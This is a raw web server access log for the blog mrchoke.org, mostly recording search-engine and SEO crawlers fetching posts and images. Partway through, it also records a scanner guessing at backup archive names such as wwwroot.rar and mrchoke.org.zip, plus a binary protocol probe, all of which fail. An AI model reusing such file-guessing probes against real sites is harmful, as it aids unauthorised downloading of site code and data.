51.222.253.14 - - [27/Jun/2022:14:05:20 +0000] "GET /img_7697/ HTTP/2.0" 200 7907 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.86 - - [27/Jun/2022:14:06:24 +0000] "GET /node/date/2005/06/03 HTTP/1.1" 301 178 "https://mrchoke.org/node/445?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [27/Jun/2022:14:06:33 +0000] "GET /node/date/2005/06/03/ HTTP/1.1" 200 8471 "https://mrchoke.org/node/445?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
40.77.167.46 - - [27/Jun/2022:14:06:39 +0000] "GET /feed/?attachment_id=1873 HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
87.250.224.3 - - [27/Jun/2022:14:07:20 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [27/Jun/2022:14:07:23 +0000] "GET /node/category/vbox HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.253.163 - - [27/Jun/2022:14:07:25 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.253.163 - - [27/Jun/2022:14:07:28 +0000] "GET /node/category/vbox HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
51.222.253.10 - - [27/Jun/2022:14:07:29 +0000] "GET /img_7718/ HTTP/2.0" 200 7905 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.22 - - [27/Jun/2022:14:07:29 +0000] "GET /page/3 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
5.45.207.92 - - [27/Jun/2022:14:07:32 +0000] "GET /node/category/vbox/ HTTP/1.1" 200 12371 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
185.191.171.14 - - [27/Jun/2022:14:07:32 +0000] "GET /page/3/ HTTP/1.1" 200 14282 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.87 - - [27/Jun/2022:14:08:22 +0000] "GET /node/441?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/441?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:08:29 +0000] "GET /node/441?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/441?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:08:39 +0000] "GET /node/441/?share=reddit HTTP/1.1" 200 7969 "https://mrchoke.org/node/441?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [27/Jun/2022:14:09:05 +0000] "GET /ch7_3364 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.12 - - [27/Jun/2022:14:09:10 +0000] "GET /img_7128/ HTTP/2.0" 200 7951 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.8 - - [27/Jun/2022:14:10:12 +0000] "GET /node/1356/img_7250 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [27/Jun/2022:14:10:13 +0000] "GET /node/1356/img_7250 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.75 - - [27/Jun/2022:14:10:15 +0000] "GET /node/112 HTTP/1.1" 404 134 "http://www.mrchoke.org/node/date/2006/10" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.8 - - [27/Jun/2022:14:10:15 +0000] "GET /node/1356/img_7250/ HTTP/1.1" 200 8003 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.5 - - [27/Jun/2022:14:11:47 +0000] "GET /img_6862/ HTTP/2.0" 200 7910 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
157.55.39.114 - - [27/Jun/2022:14:12:01 +0000] "GET /wp-content/uploads/2014/02/IMG_7711.jpg HTTP/2.0" 200 2488599 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.147.81 - - [27/Jun/2022:14:12:33 +0000] "GET /node/category/music/page/5 HTTP/1.1" 302 154 "https://mrchoke.org/node/category/music/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:12:44 +0000] "GET /node/category/music/page/5 HTTP/1.1" 301 178 "https://mrchoke.org/node/category/music/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:12:49 +0000] "GET /node/category/music/page/5/ HTTP/1.1" 200 11606 "https://mrchoke.org/node/category/music/page/4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.16 - - [27/Jun/2022:14:14:00 +0000] "GET /img_7709/ HTTP/2.0" 200 7873 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
45.9.150.140 - - [27/Jun/2022:14:14:17 +0000] "\x19\x00\x00\x00\x02type\x00" 400 166 "-" "-"
114.119.147.81 - - [27/Jun/2022:14:14:24 +0000] "GET /node/date/2006/09/page/3 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2006/09/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:14:30 +0000] "GET /node/date/2006/09/page/3 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2006/09/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:14:36 +0000] "GET /node/date/2006/09/page/3/ HTTP/1.1" 200 11708 "https://mrchoke.org/node/date/2006/09/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.25 - - [27/Jun/2022:14:15:01 +0000] "GET /node/date/2006/11/11 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.25 - - [27/Jun/2022:14:15:02 +0000] "GET /node/date/2006/11/11/ HTTP/1.1" 200 10709 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:23 +0000] "HEAD /wwwroot.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:23 +0000] "HEAD /wwwroot.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:24 +0000] "HEAD /\xD0\xC2\xBD\xA8\xCE\xC4\xBC\xFE\xBC\xD0.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:24 +0000] "HEAD /\xD0\xC2\xBD\xA8\xCE\xC4\xBC\xFE\xBC\xD0.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:24 +0000] "HEAD /www.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:25 +0000] "HEAD /www.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:25 +0000] "HEAD /web.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:25 +0000] "HEAD /web.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:25 +0000] "HEAD /mrchoke.org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:26 +0000] "HEAD /mrchoke.org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:26 +0000] "HEAD /mrchoke_org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:26 +0000] "HEAD /mrchoke_org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:27 +0000] "HEAD /mrchokeorg.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:27 +0000] "HEAD /mrchokeorg.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:27 +0000] "HEAD /mrchoke.org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:27 +0000] "HEAD /mrchoke.org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:28 +0000] "HEAD /mrchoke.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
2408:826c:7d14:4934:5d8a:506a:68a6:8286 - - [27/Jun/2022:14:15:28 +0000] "HEAD /mrchoke.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
207.46.13.149 - - [27/Jun/2022:14:16:04 +0000] "GET /wp-content/uploads/2014/01/IMG_6789.jpg HTTP/2.0" 200 2313418 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.18 - - [27/Jun/2022:14:16:16 +0000] "GET /img_6890/ HTTP/2.0" 200 7858 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.7.214.104 - - [27/Jun/2022:14:16:17 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.191.171.38 - - [27/Jun/2022:14:16:31 +0000] "GET /node/1101/ch7_3296 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [27/Jun/2022:14:16:33 +0000] "GET /node/1101/ch7_3296/ HTTP/1.1" 200 7866 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.87 - - [27/Jun/2022:14:16:45 +0000] "GET /node/category/vmware?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/category/vmware" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:16:52 +0000] "GET /node/category/vmware?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/category/vmware" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:16:57 +0000] "GET /node/category/vmware/?ak_action=reject_mobile HTTP/1.1" 200 9655 "https://mrchoke.org/node/category/vmware" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
87.250.224.4 - - [27/Jun/2022:14:17:46 +0000] "GET /node/category/vbox HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.253.119 - - [27/Jun/2022:14:17:49 +0000] "GET /node/category/vbox/ HTTP/1.1" 200 12371 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
51.222.253.3 - - [27/Jun/2022:14:18:27 +0000] "GET /img_7649/ HTTP/2.0" 200 7873 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.1 - - [27/Jun/2022:14:19:18 +0000] "GET /node/38 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.7 - - [27/Jun/2022:14:19:23 +0000] "GET /node/38/ HTTP/1.1" 200 8701 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.87 - - [27/Jun/2022:14:19:39 +0000] "GET /ch7_3328 HTTP/1.1" 301 178 "https://mrchoke.org/node/1101?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [27/Jun/2022:14:19:50 +0000] "GET /ch7_3328/ HTTP/1.1" 200 7883 "https://mrchoke.org/node/1101?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.9 - - [27/Jun/2022:14:21:18 +0000] "GET /node/date/2004/11/09/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.97 - - [27/Jun/2022:14:21:29 +0000] "GET /node/1607?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1607?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:21:35 +0000] "GET /node/1607?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1607?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:21:42 +0000] "GET /node/1607/?share=linkedin HTTP/1.1" 200 9944 "https://mrchoke.org/node/1607?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.25 - - [27/Jun/2022:14:21:53 +0000] "GET /node/302 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [27/Jun/2022:14:21:57 +0000] "GET /node/302/ HTTP/1.1" 200 8890 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.74 - - [27/Jun/2022:14:23:00 +0000] "GET /node/date/2004/06/26 HTTP/1.1" 302 154 "https://mrchoke.org/node/406?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:23:01 +0000] "GET /node/date/2004/06/26 HTTP/1.1" 301 178 "https://mrchoke.org/node/406?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:23:01 +0000] "GET /node/date/2004/06/26/ HTTP/1.1" 200 8023 "https://mrchoke.org/node/406?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.2 - - [27/Jun/2022:14:24:04 +0000] "GET /img_7703/ HTTP/2.0" 200 7878 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [27/Jun/2022:14:24:07 +0000] "GET /wp-content/uploads/2014/02/IMG_7697-150x150.jpg HTTP/2.0" 200 10660 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:14:24:08 +0000] "GET /wp-content/uploads/2014/02/IMG_7705-150x150.jpg HTTP/2.0" 200 21250 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.2 - - [27/Jun/2022:14:24:16 +0000] "GET /wp-content/uploads/2014/02/IMG_7703.jpg HTTP/2.0" 200 2513628 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.74 - - [27/Jun/2022:14:24:52 +0000] "GET /node/date/2012/05 HTTP/1.1" 302 154 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:24:59 +0000] "GET /node/date/2012/05 HTTP/1.1" 301 178 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [27/Jun/2022:14:25:05 +0000] "GET /node/date/2012/05/ HTTP/1.1" 200 12928 "https://mrchoke.org/node/939/img_6419" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
71.6.232.8 - - [27/Jun/2022:14:26:13 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
51.222.253.8 - - [27/Jun/2022:14:26:25 +0000] "GET /img_6861/ HTTP/2.0" 200 7898 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.12 - - [27/Jun/2022:14:26:29 +0000] "GET /wp-content/uploads/2014/01/IMG_6861-766x765.jpg HTTP/2.0" 200 264456 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [27/Jun/2022:14:26:31 +0000] "GET /wp-content/uploads/2014/01/IMG_6858-150x150.jpg HTTP/2.0" 200 25046 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.5 - - [27/Jun/2022:14:26:32 +0000] "GET /wp-content/uploads/2014/01/IMG_6862-150x150.jpg HTTP/2.0" 200 23785 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.81 - - [27/Jun/2022:14:27:17 +0000] "GET /node/312?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/312?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:27:23 +0000] "GET /node/312?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/312?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [27/Jun/2022:14:27:32 +0000] "GET /node/312/?ak_action=accept_mobile HTTP/1.1" 200 9083 "https://mrchoke.org/node/312?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
199.58.86.209 - - [27/Jun/2022:14:27:42 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.209 - - [27/Jun/2022:14:27:52 +0000] "GET / HTTP/1.1" 200 294 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.209 - - [27/Jun/2022:14:27:54 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
199.58.86.209 - - [27/Jun/2022:14:27:56 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
51.222.253.18 - - [27/Jun/2022:14:28:47 +0000] "GET /img_7653/ HTTP/2.0" 200 7882 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.1 - - [27/Jun/2022:14:28:51 +0000] "GET /wp-content/uploads/2014/02/IMG_7653.jpg HTTP/2.0" 200 3581166 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.4 - - [27/Jun/2022:14:28:54 +0000] "GET /wp-content/uploads/2014/02/IMG_7652-150x150.jpg HTTP/2.0" 200 18918 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.17 - - [27/Jun/2022:14:28:55 +0000] "GET /wp-content/uploads/2014/02/IMG_7658-e1392469453333-150x150.jpg HTTP/2.0" 200 27124 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.97 - - [27/Jun/2022:14:29:05 +0000] "GET /node/490?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/490?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.12 - - [27/Jun/2022:14:30:18 +0000] "GET /node/449 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.6 - - [27/Jun/2022:14:30:19 +0000] "GET /node/449 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.33 - - [27/Jun/2022:14:30:21 +0000] "GET /node/449/ HTTP/1.1" 200 8593 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [27/Jun/2022:14:30:30 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [27/Jun/2022:14:30:30 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.97 - - [27/Jun/2022:14:30:47 +0000] "GET /node/date/2014/02/06 HTTP/1.1" 301 178 "https://mrchoke.org/node/1558?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [27/Jun/2022:14:30:53 +0000] "GET /node/date/2014/02/06/ HTTP/1.1" 200 11902 "https://mrchoke.org/node/1558?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.12 - - [27/Jun/2022:14:31:15 +0000] "GET /img_7711/ HTTP/2.0" 200 7868 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
185.191.171.9 - - [27/Jun/2022:14:32:15 +0000] "GET /node/category/restaurant_city HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.43 - - [27/Jun/2022:14:32:17 +0000] "GET /node/category/restaurant_city HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.1 - - [27/Jun/2022:14:32:19 +0000] "GET /node/category/restaurant_city/ HTTP/1.1" 200 8243 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
51.222.253.2 - - [27/Jun/2022:14:33:52 +0000] "GET /node/date/2009/05/ HTTP/2.0" 200 9448 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.15 - - [27/Jun/2022:14:33:55 +0000] "GET /modules/tinymce/tinymce/jscripts/tiny_mce/plugins/emotions/img/smiley-cry.gif HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
